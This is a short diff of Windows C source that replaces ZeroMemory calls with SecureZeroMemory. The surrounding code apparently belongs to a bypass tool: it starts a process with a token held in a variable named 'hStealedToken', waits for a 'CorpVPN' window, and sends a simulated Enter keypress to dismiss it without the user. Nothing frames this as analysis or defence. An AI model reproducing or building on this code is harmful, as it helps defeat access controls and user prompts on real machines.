@@ -13,11 +13,11 @@ static BOOL CALLBACK EnumWindowsCallback
 
 	GetWindowThreadProcessId(hWnd, &dwPID);
 	if (dwPID == pStruct->dwPID) {
-		ZeroMemory(wszWindowName, sizeof(wszWindowName));
+		SecureZeroMemory(wszWindowName, sizeof(wszWindowName));
 		GetWindowTextW(hWnd, wszWindowName, _countof(wszWindowName));
 		if (!wcscmp(wszWindowName, pStruct->wszWindowsName)) {
 			SetForegroundWindow(hWnd);
-			ZeroMemory(&Inputs, sizeof(Inputs));
+			SecureZeroMemory(&Inputs, sizeof(Inputs));
 			Inputs[0].type = INPUT_KEYBOARD;
 			Inputs[0].ki.wVk = VK_RETURN;
 			Inputs[0].ki.dwFlags = KEYEVENTF_EXTENDEDKEY;
@@ -43,7 +43,7 @@ static VOID WaitWindowActive
 {
 	WINDOWS_INFO Struct;
 
-	ZeroMemory(&Struct, sizeof(Struct));
+	SecureZeroMemory(&Struct, sizeof(Struct));
 	Struct.dwPID = dwPid;
 	StrCpyW(Struct.wszWindowsName, L"CorpVPN");
 	while (TRUE) {
@@ -69,8 +69,8 @@ BOOL BypassBycomMgmtLauncher
 		goto END;
 	}
 
-	ZeroMemory(&si, sizeof(si));
-	ZeroMemory(&pi, sizeof(pi));
+	SecureZeroMemory(&si, sizeof(si));
+	SecureZeroMemory(&pi, sizeof(pi));
 	si.cb = sizeof(si);
 	if (!CreateProcessAsUserW(hStealedToken, NULL, lpCommand, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
 		goto END;
